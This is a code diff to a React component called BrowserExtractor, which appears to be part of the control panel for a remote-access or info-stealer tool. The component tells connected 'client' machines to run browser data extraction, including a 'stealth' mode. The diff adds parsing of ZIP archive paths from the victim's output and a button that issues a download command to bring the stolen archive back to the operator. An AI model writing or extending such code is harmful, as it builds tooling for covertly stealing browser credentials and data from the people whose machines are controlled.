@@ -227,6 +227,7 @@ const BrowserExtractor = ({ client, socket }) => {
   const [extracting, setExtracting] = useState(false);
   const [results, setResults] = useState([]);
   const [extractionOutput, setExtractionOutput] = useState('');
+  const [zipPath, setZipPath] = useState('');
 
   // Listen for command responses
   useEffect(() => {
@@ -235,6 +236,18 @@ const BrowserExtractor = ({ client, socket }) => {
     const handleCommandResponse = (data) => {
       if (data.clientId === client.id) {
         setExtractionOutput(prev => prev + data.response + '\n');
+        
+        // Try to detect a ZIP file path in this chunk of output
+        try {
+          const text = String(data.response || '');
+          // Match Windows paths ending in .zip (e.g., C:\Users\...\file.zip)
+          const zipRegex = /[A-Za-z]:\\[^\n\r\t\"']*?\.zip/gi;
+          const found = text.match(zipRegex);
+          if (found && found.length > 0) {
+            // Use the last match as the most recent archive path
+            setZipPath(found[found.length - 1]);
+          }
+        } catch (_) {}
         
         // Check if extraction is complete
         if (data.response.includes('Browser data extracted successfully') || 
@@ -275,12 +288,22 @@ const BrowserExtractor = ({ client, socket }) => {
 
     setExtracting(true);
     setExtractionOutput('');
+    setZipPath('');
     const command = type === 'stealth' ? 'extractbrowserstealth' : 'extractbrowser';
     
     socket.emit('executeCommand', {
       clientId: client.id,
       command: command
     });
+  };
+
+  const handleDownloadZip = () => {
+    if (!socket || !client || !zipPath) return;
+    socket.emit('executeCommand', {
+      clientId: client.id,
+      command: `download ${zipPath}`
+    });
+    toast.info('Download command sent for ZIP');
   };
 
   const handleViewPaths = () => {
@@ -404,35 +427,16 @@ const BrowserExtractor = ({ client, socket }) => {
             }}>
               {extractionOutput}
             </div>
+            {zipPath && (
+              <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: 12 }}>
+                <ActionButton onClick={handleDownloadZip} disabled={extracting}>
+                  <FiDownload />
+                  Download ZIP
+                </ActionButton>
+              </div>
+            )}
           </InfoCard>
         )}
-
-        <ResultsSection>
-          <ResultsTitle>
-            <FiHardDrive />
-            Extraction Results
-          </ResultsTitle>
-          {results.length === 0 ? (
-            <div style={{ color: '#666', textAlign: 'center', padding: '20px' }}>
-              No extraction results yet. Start an extraction to see results here.
-            </div>
-          ) : (
-            results.map((result, index) => (
-              <ResultItem key={index}>
-                <ResultInfo>
-                  <ResultName>{result.name}</ResultName>
-                  <ResultPath>{result.path}</ResultPath>
-                </ResultInfo>
-                <ResultActions>
-                  <ActionButton>
-                    <FiDownload />
-                    Download
-                  </ActionButton>
-                </ResultActions>
-              </ResultItem>
-            ))
-          )}
-        </ResultsSection>
       </Content>
     </BrowserExtractorContainer>
   );
